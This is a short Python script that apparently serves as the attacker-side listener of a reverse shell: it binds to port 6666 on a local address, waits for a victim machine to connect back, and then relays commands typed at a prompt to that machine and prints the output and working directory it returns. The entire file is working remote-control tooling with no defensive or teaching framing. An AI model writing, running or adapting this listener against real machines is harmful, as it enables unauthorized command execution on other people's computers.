import socket















#host and port should stay in the 19/20 lines

HOST='192.168.43.219'
PORT=6666
BUFFER_SIZE = 1024*128
SEPARATOR = "<sep>"

s = socket.socket()

s.bind((HOST, PORT))
s.listen(5)
print(f"Listening as {HOST}:{PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    print(results)
